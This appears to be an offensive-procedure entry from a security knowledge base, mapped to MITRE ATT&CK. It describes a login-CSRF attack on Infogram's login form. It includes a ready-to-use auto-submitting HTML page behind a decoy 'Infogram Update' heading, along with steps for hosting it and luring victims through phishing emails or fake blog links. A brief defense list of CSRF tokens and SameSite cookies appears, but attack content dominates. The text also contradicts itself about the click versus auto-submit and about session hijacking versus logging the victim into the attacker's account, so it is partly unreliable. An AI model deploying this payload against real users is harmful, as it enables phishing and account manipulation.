---
id: proc-craft-csrf-poc
tags:
  - csrf-poc
  - html-forgery
  - drive-by
type: procedure
tools: []
tactics:
  - '[[Initial Access]]'
commands: []
verified: false
platforms:
  - Web
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[Drive-by Compromise]]'
updated_at: '2025-12-14T17:27:15.332Z'
skill_level: intermediate
impact_level: medium
detection_risk: low
sub_techniques: []
validated: true
mitre_tactics:
  - '[[Initial Access]]'
mitre_techniques:
  - '[[Drive-by Compromise]]'
---
# Craft-and-Deploy-CSFR-POC

## Summary

This procedure involves creating a malicious HTML proof-of-concept (PoC) that exploits the lack of CSRF tokens in Infogram's login form, forging a POST request with attacker credentials to enable silent session takeover when loaded by the victim.

## Description

The Infogram login endpoint accepts POST requests without CSRF protection, allowing cross-origin submissions. The PoC is a simple HTML page with an auto-submitting form pre-filled with attacker credentials (e.g., username: attacker@example.com, password: secretpass). It can be disguised as a legitimate Infogram-related blog post or embedded in an email link. When the victim interacts (e.g., clicks submit), their browser sends the request in the context of their Infogram session, logging them into the attacker's account without warnings. Prerequisites include knowledge of the login endpoint URL (discovered via testing) and hosting capabilities.

## Requirements

1. Text editor to write HTML
2. Knowledge of target login endpoint (e.g., https://infogram.com/login)
3. Method to deliver PoC to victim (e.g., phishing site, email)

## Defense

Defensive measures and detection strategies:

- Implement CSRF tokens in all state-changing forms
- Use SameSite cookies to prevent cross-site requests
- Monitor for unexpected login patterns from unfamiliar origins

## Objectives

1. Forge login request to hijack victim session
2. Ensure silent execution without user prompts
3. Disguise PoC for social engineering delivery

## Instructions

### Step 1: Identify Login Endpoint

**Context**: Test the legitimate login to capture the exact POST URL and required fields.

Log into Infogram normally and use browser dev tools (Network tab) to record the login request details, such as action URL and form fields (e.g., email, password).

**Expected Output**: Endpoint details like POST /auth/login with JSON or form data.

### Step 2: Build HTML PoC

**Context**: Create the form that mimics the login submission using attacker credentials.

Write an HTML file:

```html
<!DOCTYPE html>
<html>
<body>
  <h1>Infogram Update - Click to Continue</h1>
  <form id="csrf-form" action="https://infogram.com/login" method="POST" style="display:none;">
    <input type="email" name="email" value="attacker@example.com">
    <input type="password" name="password" value="secretpass">
  </form>
  <script>document.getElementById('csrf-form').submit();</script>
</body>
</html>
```

Save as poc.html and test locally.

**Expected Output**: Form auto-submits on load.

### Step 3: Deploy and Lure Victim

**Context**: Host the PoC and trick the victim into loading it while their Infogram session is active in the same browser.

Upload to a hosting service or send via email as a 'blog post link'. Ensure it's cross-origin to trigger CSRF.

**Expected Output**: Victim loads page; request sent per dev tools.

## MITRE ATT&CK Mapping

### Tactics

- [[Initial Access]]

### Techniques

- [[Drive-by Compromise]]

### Sub-Techniques


## Commands Used


## Tools Used


## Tags

- [[csrf-poc]]
- [[html-forgery]]
- [[drive-by]]
